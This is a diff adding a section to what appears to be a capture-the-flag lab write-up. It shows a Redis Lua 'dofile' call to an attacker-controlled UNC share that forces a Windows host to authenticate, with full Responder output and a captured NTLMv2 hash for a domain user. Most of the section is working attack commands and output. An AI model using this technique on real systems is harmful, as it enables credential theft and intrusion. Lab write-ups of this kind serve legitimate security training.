@@ -389,3 +389,88 @@ active.thm:6379> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\
 (error) ERR Error running script (call to f_ce5d85ea1418770097e56c1b605053114cc3ff2e): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e'
 ```
 
+Now, tried to get the hash of that user through the below command and ran ```responder```
+simultaneously 
+
+```shell
+root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# redis-cli -h active.thm
+active.thm:6379> eval "dofile('//10.11.77.75/share')" 0
+(error) ERR Error running script (call to f_5968b16ec83997f23d03982e727fefb85bae14fd): @user_script:1: cannot open //10.11.77.75/share: Permission denied
+(1.02s)
+active.thm:6379>
+```
+
+```shell
+root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# responder -I tun0 -dvw
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.1.0
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [ON]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [ON]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.11.77.75]
+    Responder IPv6             [fe80::63be:ec47:4d0b:6963]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-73NV3MUZ1YO]
+    Responder Domain Name      [MZVI.LOCAL]
+    Responder DCE-RPC Port     [47043]
+
+[+] Listening for events...
+
+/usr/share/responder/./Responder.py:366: DeprecationWarning: setDaemon() is deprecated, set the daemon attribute instead
+  thread.setDaemon(True)
+/usr/share/responder/./Responder.py:256: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
+  server.socket = ssl.wrap_socket(server.socket, certfile=cert, keyfile=key, server_side=True)
+[SMB] NTLMv2-SSP Client   : ::ffff:10.10.84.115
+[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
+[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:43e3c1925d06e0cc:A6665ABE667D4ECEDEDAFD3A13276BB9:010100000000000080B5059B4799D801C00B4C4FED60E5C600000000020008004D005A005600490001001E00570049004E002D00370033004E00560033004D0055005A00310059004F0004003400570049004E002D00370033004E00560033004D0055005A00310059004F002E004D005A00560049002E004C004F00430041004C00030014004D005A00560049002E004C004F00430041004C00050014004D005A00560049002E004C004F00430041004C000700080080B5059B4799D801060004000200000008003000300000000000000000000000003000003B82C26CCCD09E68FE565650FA6012C38B41107BC9BE192CE6861EAD8A45F8840A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310031002E00370037002E00370035000000000000000000
+```
